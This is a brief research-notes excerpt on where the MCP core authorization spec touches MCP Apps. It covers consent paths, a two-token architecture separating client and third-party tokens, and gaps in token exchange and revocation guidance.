**Where the core auth spec touches MCP Apps (brief, per scope)**
- The 2026-07-28 RC post says that in MCP Apps, UI-initiated actions "go through the same audit and consent path as a direct tool call". The same post notes SEP-2260: server-initiated requests may occur only while the server is processing a client request, so "a user is never prompted out of nowhere". — [RC post](https://blog.modelcontextprotocol.io/posts/2026-07-28-release-candidate/)
- MCP Apps is SEP-1865, Final, Extensions Track. — [SEP index](https://modelcontextprotocol.io/seps)

### Inferences
- **Two-token architecture for diagrams:**
  - Token A is issued by the MCP AS with `aud` set to the MCP server. It travels Client → MCP Server only.
  - Token B is issued by the third-party AS with `aud` set to the third-party API. It is held only by the MCP server, bound to the user's `sub`, and travels MCP Server → third-party API only.
  - Neither token ever crosses into the other's lane. The client never sees B, and the third-party API never sees A.
- In 2025-03-26 the MCP server minted its own tokens and so was the AS. Since 2025-06-18 the MCP server's inbound token may come from an external AS, while its outbound tokens come from the third-party AS. This is the "separate resource server and authorization server" shift.

### Gaps
- The spec does not prescribe how an MCP server should exchange its inbound token for an upstream token, for example via RFC 8693 on-behalf-of. The roadmap lists "standard token exchange" as future work. — [MCP Roadmap](https://blog.modelcontextprotocol.io/posts/mcp-roadmap/)
- The spec gives no normative guidance on how long third-party tokens may be cached or how they should be revoked when the MCP token is revoked. The 2025-03-26 "session binding" lifecycle requirements were dropped without a direct replacement beyond "The MCP server is responsible for tokens".
